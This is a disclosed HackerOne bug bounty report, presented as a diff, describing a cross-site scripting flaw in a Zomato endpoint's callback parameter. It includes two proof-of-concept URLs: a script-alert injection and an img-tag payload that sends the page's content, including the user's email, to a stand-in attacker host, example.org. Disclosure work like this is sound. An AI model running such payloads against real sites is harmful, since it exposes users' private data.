@@ -1,0 +1,22 @@
+ReportLink:https://hackerone.com/reports/138262
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/dejavuln
+ReportedTo:Zomato(zomato)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:16.06.2016 10:01:21
+
+Summary:
+
+`https://www.zomato.com/php/instagram_tag_relay` is vulnerable to XSS via the `callback` parameter (both POST and GET).
+
+PoC:  
+`https://www.zomato.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E`
+
+In addition, when a Zomato user accesses the page after having connected his Zomato account to Instagram, the page contains sensitive data (such as the user's email address). An attacker can use the vulnerability to access this data. 
+
+PoC:
+`https://www.zomato.com/php/instagram_tag_relay?callback=><img+src%3dhttps%3a//example.org/%3f`
+
+(causes the victim's browser to send a request to the attacker's server `example.org`, leaking the page's content).
